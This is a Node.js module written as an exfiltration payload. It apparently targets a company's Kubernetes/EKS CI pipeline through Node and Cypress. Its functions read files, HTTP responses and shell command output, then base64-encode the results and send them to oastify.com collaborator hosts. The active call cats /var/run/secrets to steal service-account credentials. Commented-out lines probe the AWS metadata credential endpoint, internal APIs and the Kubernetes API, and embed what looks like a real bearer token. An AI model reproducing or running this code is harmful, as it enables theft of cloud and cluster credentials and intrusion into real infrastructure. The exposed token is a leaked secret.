const fs = require('node:fs');
var exec = require('child_process').exec;
const { execSync } = require('child_process');

function runCommand(command) {
    try {
        const output = execSync(command, { encoding: 'utf-8', stdio: 'pipe' });
        return { stdout: output, stderr: null };
    } catch (error) {
        return {
            stdout: error.stdout ? error.stdout.toString() : null,
            stderr: error.stderr ? error.stderr.toString() : error.message
        };
    }
}


function exfilData(data, tag) {
    fetch(`https://dubvx791ihcby229izkvtr7eh5nwbxzm.oastify.com/${tag}/${btoa(data)}`);
}

function exfilHTTP(route, tag) {
  fetch(route)
      .then((response) => response.text())
      .then((data) => {
        exfilData(data, tag)
        console.log(data);
      })
      .catch((error) => console.error("Fetch error:", error));
}

function exfilCypress(route, tag) {
    cy.request(route).then((resp) => {
      cy.visit(`https://ra59dlpfyvspeginyd0995nsxj3ar5fu.oastify.com/${tag}/${btoa(JSON.stringify(resp.body))}`)
      cy.waitForHydration()
    })
}

function exfilFile(file, tag) {
  fs.readFile(file, 'utf8', (err, data) => {
    if (err) {
      return;
    }
    exfilData(data, tag);
  });
}

function detectEnvironment() {
    const detectedGlobals = [];

    if (typeof window !== 'undefined' && typeof document !== 'undefined') {
        detectedGlobals.push('window', 'document');
    }

    if (typeof process !== 'undefined' && typeof require !== 'undefined') {
        detectedGlobals.push('process', 'require');
    }

    if (typeof Deno !== 'undefined') {
        detectedGlobals.push('Deno');
    }

    // If no known environment was detected, add 'Unknown' as a placeholder
    if (detectedGlobals.length === 0) {
        detectedGlobals.push('Unknown');
    }

    return detectedGlobals;
}

function exfilCmd(cmd, tag) {
}

function exfilAll(tag) {
  //exfilHTTP('http://169.254.169.254/latest/meta-data/iam/security-credentials/', tag)
  //exfilHTTP('http://169.254.169.254/latest/meta-data/iam/security-credentials/prd-sh-frontendcicd-eks-use1b-z64-node-role', tag)
  //exfilHTTP('http://janus-config-api.vtexinternal.com/janus-api/v4/namespaces/core-ingress/apps', tag)
  //exfilFile('/etc/eks/bootstrap.sh', tag) didn't work at all

  //exfilData(JSON.stringify(detectEnvironment()), tag)
  //exfilData(JSON.stringify(runCommand('printenv')), tag)
  exfilData(JSON.stringify(runCommand('cat /var/run/secrets/* || cat /var/run/secrets/*/* || cat /var/run/secrets/*/*/*')), tag)


  //exfilData(JSON.stringify(runCommand('wget http://10.43.199.227:9000/status -O -')), tag)
  //exfilData(JSON.stringify(runCommand('wget --header="Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImVmNmM3MjgxYTY5MWI4MGRmZDFlNWFmYTFhOTY5MzNiYjZjM2I3ZWIifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjIl0sImV4cCI6MTc2MjU0Mjk4MSwiaWF0IjoxNzMxMDA2OTgxLCJpc3MiOiJodHRwczovL29pZGMuZWtzLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tL2lkLzNBQjMxNDlDNTE3ODRDRkU0MDAzOTY1RDA4MzMxN0QwIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJmYXN0c3RvcmUtcGlwZWxpbmVzIiwicG9kIjp7Im5hbWUiOiJmYXN0c3RvcmUtcnVuLXRzZjR4LWxpZ2h0aGhvdXNlLWNpLWpnNmxqLXBvZC1uOWt3cCIsInVpZCI6ImVjYTZlNGExLTEzOGEtNDg3My1hMmU3LTVmYjFhNTExYzRjZSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoidGVrdG9uLXRyaWdnZXJzLWFkbWluIiwidWlkIjoiYmFlYTRlZGUtOGVhNy00MGVkLWJkYzMtNjRlMjEyYjAwYWI3In0sIndhcm5hZnRlciI6MTczMTAxMDU4OH0sIm5iZiI6MTczMTAwNjk4MSwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmZhc3RzdG9yZS1waXBlbGluZXM6dGVrdG9uLXRyaWdnZXJzLWFkbWluIn0.GikryhBOnA9I5VrxfUxqFNx2BSeC3ACIrrR8MbR3SHrextq1HGU4QDqzc-oC3uj0GPmtEfiXb7S-hdGC_em8DB0tbZmAiTuef11u16UNIDix2jW8XtA-kKSXD7YJhSZFtEXmxV2g7cApR7inu6A18YueKvVW3VTQf4YgD2JWbmFWf0Th3c00N21-1K2Ehvp_GiEO1KPtykz919Ba6CR6TJofI5axnrsuANa4QsCYFXlk7M2xqa8b5RGdtkZYJiAdtfVgxEc6n1CrWwE-e2ap7e4VIdB0OrzRuhSdwmRfhImL-SM0dX20pNJOZiwCq9lAh2vi5w76YiYLFU-EWCDyDQ" --no-check-certificate -O - https://10.43.0.1:443/api/v1/namespaces')), tag)

}

module.exports = { exfilHTTP, exfilCypress, exfilFile, exfilAll };

